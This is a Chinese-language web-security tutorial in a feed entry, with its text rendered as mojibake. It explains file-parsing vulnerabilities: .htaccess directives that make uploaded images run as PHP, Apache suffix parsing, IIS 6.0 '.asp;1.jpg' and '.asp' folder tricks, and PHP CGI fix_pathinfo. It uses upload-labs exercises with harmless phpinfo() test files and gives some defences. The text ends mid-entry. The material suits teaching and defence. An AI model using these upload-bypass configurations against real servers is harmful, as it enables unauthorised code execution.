        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ–‡ä»¶è§£ææ¼æ´ç®€ä»‹"><a href="#ä¸€ã€æ–‡ä»¶è§£ææ¼æ´ç®€ä»‹" class="headerlink" title="ä¸€ã€æ–‡ä»¶è§£ææ¼æ´ç®€ä»‹"></a>ä¸€ã€æ–‡ä»¶è§£ææ¼æ´ç®€ä»‹</h1><p>æ–‡ä»¶è§£ææ¼æ´æ˜¯Webå®‰å…¨é¢†åŸŸä¸­çš„ä¸€ç§å¸¸è§æ¼æ´ï¼Œä¸»è¦å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£ææ–‡ä»¶æ—¶ï¼Œæœªèƒ½æ­£ç¡®å¤„ç†æ–‡ä»¶å†…å®¹æˆ–æ ¼å¼ï¼Œä»è€Œå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚è¿™ç§æ¼æ´å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œé€šè¿‡ä¸Šä¼ æˆ–å¤„ç†æ¶æ„æ„é€ çš„æ–‡ä»¶ï¼Œæ¥æ‰§è¡Œæœªæˆæƒçš„æ“ä½œï¼Œä¾‹å¦‚è¿œç¨‹ä»£ç æ‰§è¡Œã€ä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡æ”»å‡»ç­‰ã€‚</p><p>æ–‡ä»¶è§£ææ¼æ´å¯ä»¥ä¸ºæ–‡ä»¶ä¸Šä¼ æ¼æ´æä¾›æ¼æ´åˆ©ç”¨çš„å¯èƒ½ï¼Œä¸¤è€…å…³ç³»ç´§å¯†ï¼Œç›¸è¾…ç›¸æˆã€‚ç»“åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸Šä¼ çš„æ˜¯ä¸€å¼ å›¾ç‰‡æœ¨é©¬çš„è¯ï¼Œåˆ©ç”¨è§£ææ¼æ´å¯ä»¥ä½¿æœåŠ¡å™¨å°†pngç­‰å›¾ç‰‡æ–‡ä»¶å½“ä½œphpç­‰è„šæœ¬æ–‡ä»¶æ‰§è¡Œã€‚</p><h1 id="äºŒã€-htaccessæ”»å‡»ï¼ˆ-htaccess-æ–‡ä»¶è§£æï¼‰"><a href="#äºŒã€-htaccessæ”»å‡»ï¼ˆ-htaccess-æ–‡ä»¶è§£æï¼‰" class="headerlink" title="äºŒã€.htaccessæ”»å‡»ï¼ˆ.htaccess æ–‡ä»¶è§£æï¼‰"></a>äºŒã€.htaccessæ”»å‡»ï¼ˆ.htaccess æ–‡ä»¶è§£æï¼‰</h1><h2 id="2-1-htaccessé…ç½®ç®€ä»‹"><a href="#2-1-htaccessé…ç½®ç®€ä»‹" class="headerlink" title="2.1 .htaccessé…ç½®ç®€ä»‹"></a>2.1 .htaccessé…ç½®ç®€ä»‹</h2><p> å¦‚æœç½‘ç«™å…è®¸<code>.htaccess</code>é…ç½®è¦†ç›–å…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”<code>.htaccess</code>æ–‡ä»¶ç”¨æˆ·å¯ä»¥ä¸Šä¼ æˆ–ç¼–è¾‘ä¿®æ”¹ï¼Œé‚£ä¹ˆç½‘ç«™å­˜åœ¨å·¨å¤§çš„å®‰å…¨æ¼æ´ï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶è§£æï¼Œç½‘ç«™æ²¦é™·ã€‚</p><p> .htaccessæ˜¯ApacheæœåŠ¡å™¨çš„åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼Œè¯¥é…ç½®æ–‡ä»¶ä¼šè¦†ç›–ApacheæœåŠ¡å™¨çš„å…¨å±€é…ç½®ï¼Œä½œç”¨åŸŸæ˜¯å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ã€‚</p><p> å¦‚æœä¸€ä¸ªWebåº”ç”¨å…è®¸ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œé‚£å°±æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ›´æ”¹Apacheçš„é…ç½®ï¼Œè¿™æ˜¯ååˆ†å±é™©çš„ã€‚. htaccess æ”»å‡»æƒ³è±¡ç©ºé—´éå¸¸å¤§ã€‚</p><p>é¦–å…ˆçœ‹Apacheçš„é…ç½®ï¼Œå…è®¸.htaccessæ–‡ä»¶è¦†ç›–æ‰Apacheçš„é…ç½®ã€‚</p><blockquote><h4 id="EXï¼šApache-å…è®¸-htaccess-æ–‡ä»¶è¦†ç›–æ‰Apacheçš„é…ç½®"><a href="#EXï¼šApache-å…è®¸-htaccess-æ–‡ä»¶è¦†ç›–æ‰Apacheçš„é…ç½®" class="headerlink" title="EXï¼šApache å…è®¸.htaccess æ–‡ä»¶è¦†ç›–æ‰Apacheçš„é…ç½®"></a>EXï¼šApache å…è®¸.htaccess æ–‡ä»¶è¦†ç›–æ‰Apacheçš„é…ç½®</h4><p>httpd.conf</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-05%20%E4%B8%8B%E5%8D%884.44.54.png" style="zoom:75%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-05%20%E4%B8%8B%E5%8D%884.46.10.png" style="zoom:55%;"><p> AllowOverride All</p></blockquote><p>å¦‚ä½•åˆ©ç”¨.htaccess æ”»å‡»ï¼š</p><h2 id="2-2-å°†-pngæ–‡ä»¶å½“ä½œPHPæ–‡ä»¶è§£æ"><a href="#2-2-å°†-pngæ–‡ä»¶å½“ä½œPHPæ–‡ä»¶è§£æ" class="headerlink" title="2.2 å°†.pngæ–‡ä»¶å½“ä½œPHPæ–‡ä»¶è§£æ"></a>2.2 å°†.pngæ–‡ä»¶å½“ä½œPHPæ–‡ä»¶è§£æ</h2><p>å°†ä»¥ä¸‹ä»£ç å†™å…¥æ–‡ä»¶ï¼Œå¹¶ä¿å­˜æˆ.htaccessåå­—ï¼Œ æ”¾åˆ°æµ‹è¯•ç›®å½•ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨åŒä¸€ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶[info.png],æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å½“æˆ‘ä»¬è®¿é—®è¯¥æ–‡ä»¶æ—¶ï¼Œ[ info.png]å†…çš„PHPä»£ç å°†ä¼šè¢«æ‰§è¡Œã€‚</p><blockquote><h4 id="EXï¼šåˆ©ç”¨-htaccessæ–‡ä»¶ä½¿å¾—-pngæ–‡ä»¶å¯ä»¥è¢«è§£ææ‰§è¡Œ"><a href="#EXï¼šåˆ©ç”¨-htaccessæ–‡ä»¶ä½¿å¾—-pngæ–‡ä»¶å¯ä»¥è¢«è§£ææ‰§è¡Œ" class="headerlink" title="EXï¼šåˆ©ç”¨.htaccessæ–‡ä»¶ä½¿å¾—.pngæ–‡ä»¶å¯ä»¥è¢«è§£ææ‰§è¡Œ"></a>EXï¼šåˆ©ç”¨.htaccessæ–‡ä»¶ä½¿å¾—.pngæ–‡ä»¶å¯ä»¥è¢«è§£ææ‰§è¡Œ</h4><p>1ã€å‡†å¤‡.htaccessæ–‡ä»¶ï¼Œwinç³»ç»Ÿæ²¡æ³•åˆ›å»ºã€‚</p><p>mac åˆ›å»ºï¼Œå¹¶ä¸Šä¼ åˆ°ç›¸åº”ç›®å½•ã€‚macä¸Šåˆ›å»ºçš„è¯ä¼šéšè—èµ·æ¥ã€‚å¯ä»¥åœ¨BPæŠ“åŒ…çš„æ—¶å€™å†ä¿®æ”¹æ–‡ä»¶åã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%888.46.34.png" style="zoom:45%;"><p>mac å¦‚ä½•æ˜¾ç¤ºéšè—æ–‡ä»¶å’Œ.ç‚¹å¼€å¤´æ–‡ä»¶ï¼Ÿ</p><p>å¦‚æœæƒ³åœ¨Finderä¸­å°±èƒ½ç›´è§‚çœ‹åˆ°éšè—æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨ç»ˆç«¯ä¸­è¾“å…¥ä»¥ä¸‹ä¸‹å‘½ä»¤ï¼š</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults <span class="token function">write</span> com.apple.Finder AppleShowAllFiles YES<span class="token function">killall</span> Finder<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>win ç”¨notepad++ç©¿ä»¶æ–°æ–‡ä»¶ï¼Œä¿å­˜çš„æ—¶å€™é€‰æ‹©*.*æ ¼å¼å³å¯åˆ›å»º.htaccessæ–‡ä»¶ã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.27.27.png" style="zoom:75%;"><p>2ã€å‡†å¤‡åç¼€åä¸º.pngçš„phpè„šæœ¬ã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%888.54.55.png" style="zoom:55%;"><p>3ã€è®¿é—®è§£ææ‰§è¡Œã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%888.55.38.png" style="zoom:35%;"><p>æ³¨é‡Šæ‰.htaccessä¸­çš„é…ç½®ï¼Œ.pngä¸å¯è§£ææ‰§è¡Œã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%888.56.52.png" style="zoom:45%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%888.56.38.png" style="zoom:45%;"></blockquote><p>åˆ©ç”¨æ€è·¯ï¼š åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œå…¶ä¸­é…ç½®ç›¸å…³æ¡ç›®ä½¿å¾—jpg,pngç­‰æ–‡ä»¶å¯ä»¥è¢«å½“ä½œphpç­‰å¯æ‰§è¡Œè„šæœ¬è§£æã€‚</p><h2 id="2-3-æ–‡ä»¶åå­—ä¸­åŒ…å«-phpå…³é”®å­—å³å¯æ‰§è¡Œ"><a href="#2-3-æ–‡ä»¶åå­—ä¸­åŒ…å«-phpå…³é”®å­—å³å¯æ‰§è¡Œ" class="headerlink" title="2.3 æ–‡ä»¶åå­—ä¸­åŒ…å«.phpå…³é”®å­—å³å¯æ‰§è¡Œ"></a>2.3 æ–‡ä»¶åå­—ä¸­åŒ…å«.phpå…³é”®å­—å³å¯æ‰§è¡Œ</h2><p>å½“æ–‡ä»¶å[info.php.png]ä¸­åŒ…å«å…³é”®å­—[.php],å¹¶ä¸”.htaccessæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œinfo.php.pngä¸­çš„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">AddHandler php5-script php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="EXï¼š-htaccess-è§£æä»»æ„åŒ…å«-php-å…³é”®å­—çš„æ–‡ä»¶"><a href="#EXï¼š-htaccess-è§£æä»»æ„åŒ…å«-php-å…³é”®å­—çš„æ–‡ä»¶" class="headerlink" title="EXï¼š.htaccess è§£æä»»æ„åŒ…å«.php.å…³é”®å­—çš„æ–‡ä»¶"></a>EXï¼š.htaccess è§£æä»»æ„åŒ…å«.php.å…³é”®å­—çš„æ–‡ä»¶</h4><p>.htaccess æ–‡ä»¶çš„å†…å®¹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">AddHandler php5-script php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‡†å¤‡ç›¸å…³æµ‹è¯•æ–‡ä»¶ï¼š</p><p>haha.phpinfo.png ã€âŒï¼Œè¿™ç§æ–‡ä»¶åä¸è¡Œï¼Œå‰åéƒ½æœ‰ç‚¹æ‰è¡Œã€‘</p><p>haha.php.info.png ã€âœ…ï¼Œè¿™ç§æ–‡ä»¶åå¯ä»¥ï¼Œå‰åéƒ½æœ‰ç‚¹æ‰è¡Œã€‘</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.15.43.png" style="zoom:35%;"></blockquote><h2 id="2-4-åŒ¹é…æ–‡ä»¶åè§£æ"><a href="#2-4-åŒ¹é…æ–‡ä»¶åè§£æ" class="headerlink" title="2.4 åŒ¹é…æ–‡ä»¶åè§£æ"></a>2.4 åŒ¹é…æ–‡ä»¶åè§£æ</h2><p>ä»¥ä¸‹é…ç½®æ˜¯åŒ¹é…æ–‡ä»¶å[hack]ï¼Œæ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„PHPä»£ç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>FilesMatch <span class="token string double-quoted-string">"hack"</span><span class="token operator">&gt;</span>SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="EXï¼šåŒ¹é…æ–‡ä»¶åè§£ææ‰§è¡Œä»»æ„æ–‡ä»¶"><a href="#EXï¼šåŒ¹é…æ–‡ä»¶åè§£ææ‰§è¡Œä»»æ„æ–‡ä»¶" class="headerlink" title="EXï¼šåŒ¹é…æ–‡ä»¶åè§£ææ‰§è¡Œä»»æ„æ–‡ä»¶"></a>EXï¼šåŒ¹é…æ–‡ä»¶åè§£ææ‰§è¡Œä»»æ„æ–‡ä»¶</h4><p>1ã€.htaccess æ–‡ä»¶çš„å†…å®¹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>FilesMatch <span class="token string double-quoted-string">"hack"</span><span class="token operator">&gt;</span>SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2ã€å‡†å¤‡æµ‹è¯•æ–‡ä»¶ï¼š</p><p>hackã€âœ…å¯ä»¥è§£ææ‰§è¡Œã€‘</p><p>sxkhackã€âœ… å¯ä»¥è§£ææ‰§è¡Œã€‘</p><p>3ã€ç»“è®ºï¼Œåªéœ€è¦æ–‡ä»¶åä¸­åŒ…å«å…³é”®è¯å°±è¡Œã€‚</p></blockquote><blockquote><h4 id="EX-upload-labs-pass-4"><a href="#EX-upload-labs-pass-4" class="headerlink" title="EX:upload-labs-pass-4"></a>EX:upload-labs-pass-4</h4><p>1ã€å‡†å¤‡.htaccessæ–‡ä»¶å’Œå¾…è§£æçš„ç›®æ ‡æ–‡ä»¶ sxkhack</p><p>.htaccess </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>FilesMatch <span class="token string">"sxk"</span><span class="token operator">&gt;</span>SetHandler application/x-httpd-php<span class="token operator">&lt;</span>/FilesMatch<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>sxkhack</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2ã€ä¸Šä¼ ä¸¤è€…è¿›è¡Œæµ‹è¯•</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.40.30.png" style="zoom:35%;"><p>.htaccess å’Œç›®æ ‡æ–‡ä»¶å‡ä¸Šä¼ æˆåŠŸï¼Œç›®æ ‡æ–‡ä»¶å¯ä»¥è§£æã€‚</p></blockquote><h1 id="ä¸‰ã€Webå®¹å™¨æ–‡ä»¶è§£ææ¼æ´"><a href="#ä¸‰ã€Webå®¹å™¨æ–‡ä»¶è§£ææ¼æ´" class="headerlink" title="ä¸‰ã€Webå®¹å™¨æ–‡ä»¶è§£ææ¼æ´"></a>ä¸‰ã€Webå®¹å™¨æ–‡ä»¶è§£ææ¼æ´</h1><h2 id="3-1-Apacheè§£ææ¼æ´"><a href="#3-1-Apacheè§£ææ¼æ´" class="headerlink" title="3.1 Apacheè§£ææ¼æ´"></a>3.1 Apacheè§£ææ¼æ´</h2><p>  Apacheä»åå¾€å‰è§£ææ–‡ä»¶åï¼Œç›´åˆ°ç¢°åˆ°å®ƒè®¤è¯†çš„æ–‡ä»¶ååç¼€æ—¶å¼€å§‹è§£æï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­é»‘åå•è¢«ç»•è¿‡ï¼Œç›®æ ‡å¯æ‰§è¡Œæ–‡ä»¶è¢«æˆåŠŸè§£ææ‰§è¡Œã€‚</p><p>âš ï¸ï¼šApacheæ–°ç‰ˆç‰ˆå·²ç»ä¿®å¤äº†ä»åå¾€å‰çš„è¿™æ ·ä¸€ä¸ªæ–‡ä»¶è§£ææ¼æ´ã€‚å¸¸å‡ºç°åœ¨CTFä¸­ã€‚</p><blockquote><h4 id="EXï¼šapacheæ–‡ä»¶è§£ææ¼æ´-upload-labs-pass-4"><a href="#EXï¼šapacheæ–‡ä»¶è§£ææ¼æ´-upload-labs-pass-4" class="headerlink" title="EXï¼šapacheæ–‡ä»¶è§£ææ¼æ´ upload-labs-pass-4"></a>EXï¼šapacheæ–‡ä»¶è§£ææ¼æ´ upload-labs-pass-4</h4><p>1ã€åˆ›å»ºç›®æ ‡æ–‡ä»¶</p><p>åç¼€åï¼š<code>.php.xxx.xx.x</code></p><p>å†…å®¹ï¼š<code>&lt;?php phpinfo();?&gt;</code></p><p>2ã€ä¸Šä¼ è¿›è¡Œæ¼æ´éªŒè¯</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.50.51.png" style="zoom:45%;"></blockquote><h2 id="3-2-IIS6-0-è§£ææ¼æ´"><a href="#3-2-IIS6-0-è§£ææ¼æ´" class="headerlink" title="3.2 IIS6.0 è§£ææ¼æ´"></a>3.2 IIS6.0 è§£ææ¼æ´</h2><h3 id="3-2-1-asp-1-jpg"><a href="#3-2-1-asp-1-jpg" class="headerlink" title="3.2.1 .asp;1.jpg"></a>3.2.1 .asp;1.jpg</h3><p>eg: time.asp;1.jpg</p><blockquote><h4 id="EXï¼šIIS6-0æ–‡ä»¶è§£ææ¼æ´ä¹‹ä¸€-asp-1-jpg"><a href="#EXï¼šIIS6-0æ–‡ä»¶è§£ææ¼æ´ä¹‹ä¸€-asp-1-jpg" class="headerlink" title="EXï¼šIIS6.0æ–‡ä»¶è§£ææ¼æ´ä¹‹ä¸€ -.asp;1.jpg"></a>EXï¼šIIS6.0æ–‡ä»¶è§£ææ¼æ´ä¹‹ä¸€ -.asp;1.jpg</h4><p>windows 2003 </p><p>   1ã€åˆ›å»ºåˆæ³•ç›®æ ‡æ–‡ä»¶</p><p> åç¼€åï¼štime.asp</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%=time()%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.58.10.png" style="zoom:75%;"><p>æ­£å¸¸è®¿é—®æ‰§è¡Œã€‚</p><p>2ã€æ›´æ”¹åç¼€åè¿›è¡Œæ¼æ´éªŒè¯ã€‚</p><p>åç¼€å:time.asp;1.jpg</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.59.28.png" style="zoom:75%;"><p>å›¾åƒæ–‡ä»¶è¢«è§£ææ‰§è¡Œã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.59.57.png" style="zoom:65%;"><p>3ã€ç»“è®º</p><p>   é’ˆå¯¹IIS6.0çš„è§£ææ¼æ´ï¼Œå¯ä»¥å°†æ¶æ„aspä»£ç ä¼ªè£…æˆjpgå›¾åƒç­‰åˆæ³•æ–‡ä»¶ï¼Œç»•è¿‡æ£€æµ‹ï¼ŒæœåŠ¡å™¨ä»å¯ä»¥è§£ææ‰§è¡Œæ¶æ„ä»£ç ã€‚</p></blockquote><h3 id="3-2-2-1-asp-time-jpg"><a href="#3-2-2-1-asp-time-jpg" class="headerlink" title="3.2.2 1.asp/time.jpg"></a>3.2.2 1.asp/time.jpg</h3><p>ä»¥.aspç»“å°¾çš„ç›®å½•ä¸‹çš„æ–‡ä»¶è¢«è§£æä¸ºaspè„šæœ¬æ‰§è¡Œã€‚</p><blockquote><h4 id="EXï¼šIIS6-0æ–‡ä»¶è§£ææ¼æ´ä¹‹äºŒ-1-asp-time-jpg"><a href="#EXï¼šIIS6-0æ–‡ä»¶è§£ææ¼æ´ä¹‹äºŒ-1-asp-time-jpg" class="headerlink" title="EXï¼šIIS6.0æ–‡ä»¶è§£ææ¼æ´ä¹‹äºŒ -1.asp/time.jpg"></a>EXï¼šIIS6.0æ–‡ä»¶è§£ææ¼æ´ä¹‹äºŒ -1.asp/time.jpg</h4><p>1ã€åˆ›å»º 1.aspç›®å½•ï¼Œä¸‹é¢çš„time.aspè„šæœ¬æ”¹åä¸ºtime.jpg</p><p>time.jpgçš„å†…å®¹</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%=time()%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2ã€è®¿é—®æµ‹è¯•</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.13.26.png" style="zoom:55%;"><p>3ã€ç»“è®º</p><p>ä»¥.aspç»“å°¾çš„ç›®å½•ä¸‹é¢çš„åˆæ³•æ–‡ä»¶ä¼šè¢«è§£ææˆè„šæœ¬æ‰§è¡Œã€‚</p><p>åˆ©ç”¨ï¼Ÿè®¾æ³•åˆ›å»º1.aspè¿™æ ·çš„æ–‡ä»¶å¤¹ï¼Œä¸‹é¢æ”¾æ–‡ä»¶ååˆæ³•ä½†æ˜¯å†…å®¹æ˜¯æ¶æ„ä»£ç çš„æ–‡ä»¶ï¼Œæ¶æ„ä»£ç å¯ä»¥è§£ææ‰§è¡Œã€‚</p></blockquote><h2 id="3-3-PHP-CGIè§£ææ¼æ´"><a href="#3-3-PHP-CGIè§£ææ¼æ´" class="headerlink" title="3.3 PHP CGIè§£ææ¼æ´"></a>3.3 PHP CGIè§£ææ¼æ´</h2><h3 id="3-3-1-åŸç†"><a href="#3-3-1-åŸç†" class="headerlink" title="3.3.1 åŸç†"></a>3.3.1 åŸç†</h3><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.17.00.png" style="zoom:75%;"><p>cgi.fix_pathinfoå‚æ•°åœ¨é»˜è®¤å¼€å¯çš„æƒ…å†µä¸‹ä¼šé€ æˆæ–‡ä»¶è§£ææ¼æ´ã€‚</p><p>[info.png/.php ] pngå›¾ç‰‡ä¸­çš„phpä»£ç è§£ææ‰§è¡Œã€‚</p><p>å¹³å°ï¼šIIS7.5/7.0 + PHP 5.4.45/5.2.17 ã€ ngix + PHP </p><p>âš ï¸ï¼šè¿™ä¸ªæ¼æ´è·ŸIISå’Œnginxæ²¡å…³ç³»ï¼Œå’ŒPHP å‚æ•° cgi.fix_pathinfoçš„è®¾ç½®æœ‰å…³ç³»ã€‚</p><h3 id="3-3-2-é˜²å¾¡"><a href="#3-3-2-é˜²å¾¡" class="headerlink" title="3.3.2 é˜²å¾¡"></a>3.3.2 é˜²å¾¡</h3><p>F1ã€æ‰¾åˆ°å¤„ç†æ˜ å°„ç¨‹åº-è¯·æ±‚é™åˆ¶-æ˜ å°„-å‹¾ä¸Š</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.31.45.png" style="zoom:35%;"><p>F2ã€å°†PHP cgi.fix_pathinfo è®¾ç½®ä¸º0</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.34.54.png" style="zoom:75%;"><h3 id="3-3-3-IIS7-0-7-5-PHPç¯å¢ƒæµ‹è¯•å’Œé˜²å¾¡"><a href="#3-3-3-IIS7-0-7-5-PHPç¯å¢ƒæµ‹è¯•å’Œé˜²å¾¡" class="headerlink" title="3.3.3 IIS7.0/7.5 + PHPç¯å¢ƒæµ‹è¯•å’Œé˜²å¾¡"></a>3.3.3 IIS7.0/7.5 + PHPç¯å¢ƒæµ‹è¯•å’Œé˜²å¾¡</h3><p>ä¸€èˆ¬æ¥è¯´phpå’Œapacheé…åˆã€‚</p><blockquote><h4 id="EXï¼šIIS7-0-7-5-PHP-CGIè§£ææ¼æ´"><a href="#EXï¼šIIS7-0-7-5-PHP-CGIè§£ææ¼æ´" class="headerlink" title="EXï¼šIIS7.0/7.5 + PHP CGIè§£ææ¼æ´"></a>EXï¼šIIS7.0/7.5 + PHP CGIè§£ææ¼æ´</h4><p>step1:è®©IIS7.5/7.0æ”¯æŒPHPç¯å¢ƒ</p><p>1ã€å®‰è£…IIS</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.31.05.png" style="zoom:35%;"><p>IISæ­å»ºæˆåŠŸã€‚</p><p>åˆ æ‰é»˜è®¤ç½‘ç«™é‡æ–°å»ºä¸€ä¸ªç½‘ç«™ã€‚</p><p>2ã€æ–°å»ºç«™ç‚¹ã€‚</p><p>test 80ç«¯å£ æŒ‡å®šç‰©ç†è·¯å¾„ wwwroot</p><p>å…¶å®å’Œé»˜è®¤ç«™ç‚¹é…ç½®ä¸€æ ·ã€‚</p><p>3ã€IIS7è°ƒç”¨PHPç¯å¢ƒ</p><p>ä½¿ç”¨phpstudyç¯å¢ƒï¼šC:\phpstudy\php\php-5.4.45</p><p> åˆ›å»ºå¤„ç†æ˜ å°„ç¨‹åºã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.44.32.png" style="zoom:75%;"><p>åŒå‡»-æ·»åŠ æ¨¡å—æ˜ å°„-</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.47.20.png" style="zoom:55%;"><p>åç§°éšä¾¿èµ·ã€‚ç‚¹å‡»ç¡®å®šï¼Œæ˜¯ã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.48.18.png" style="zoom:75%;"><p>é…ç½®FastCGIç›‘è§†PHPé…ç½®æ–‡ä»¶</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.49.09.png" style="zoom:35%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.50.29.png" style="zoom:35%;"><p>ç¼–è¾‘-é€‰æ‹©php.ini.</p><p>4ã€æµ‹è¯•IISæ˜¯å¦æ”¯æŒPHPè„šæœ¬è§£æ</p><p> C:\inetpub\wwwroot\info.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¿é—®ï¼š</p><img 